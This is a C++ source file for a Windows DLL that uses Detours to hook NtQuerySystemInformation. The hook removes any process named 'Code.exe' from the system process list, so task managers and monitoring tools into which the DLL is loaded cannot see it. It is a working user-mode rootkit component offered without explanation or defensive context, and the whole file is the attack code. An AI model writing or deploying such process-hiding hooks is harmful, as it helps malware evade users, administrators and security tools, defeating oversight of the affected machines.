#include "pch.h"

#define HIDE_PROCNAME L"Code.exe"

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

typedef NTSTATUS(NTAPI* NtQuerySystemInformation_t)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

NtQuerySystemInformation_t origNtQuerySystemInformation = NULL;

NTSTATUS NTAPI HookedNtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass, 
    PVOID SystemInformation, 
    ULONG SystemInformationLength, 
    PULONG ReturnLength) 
{
    NTSTATUS status = origNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

    if (NT_SUCCESS(status) && SystemInformationClass == SystemProcessInformation) {
        PSYSTEM_PROCESS_INFORMATION pCurrent = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
        PSYSTEM_PROCESS_INFORMATION pPrevious = NULL;

        while (pCurrent != NULL) {
            BOOL isHidden = FALSE;

            if (pCurrent->ImageName.Buffer != NULL &&
                StrStrIW(pCurrent->ImageName.Buffer, HIDE_PROCNAME) != NULL) {

                if (pPrevious != NULL) {
                    if (pCurrent->NextEntryOffset == 0) {
                        pPrevious->NextEntryOffset = 0;
                    } else {
                        pPrevious->NextEntryOffset += pCurrent->NextEntryOffset;
                    }
                    isHidden = TRUE;
                }
            }

            if (pCurrent->NextEntryOffset == 0) {
                break;
            }

            if (!isHidden) {
                pPrevious = pCurrent;
            }
            
            pCurrent = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);
        }
    }
    return status;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        
        origNtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");
        
        if (origNtQuerySystemInformation != NULL) {
            DetourTransactionBegin();
            DetourUpdateThread(GetCurrentThread());
            DetourAttach(&(PVOID&)origNtQuerySystemInformation, HookedNtQuerySystemInformation);
            DetourTransactionCommit();
        }
        break;

    case DLL_PROCESS_DETACH:
        if (origNtQuerySystemInformation != NULL) {
            DetourTransactionBegin();
            DetourUpdateThread(GetCurrentThread());
            DetourDetach(&(PVOID&)origNtQuerySystemInformation, HookedNtQuerySystemInformation);
            DetourTransactionCommit();
        }
        break;
    }
    return TRUE;
}
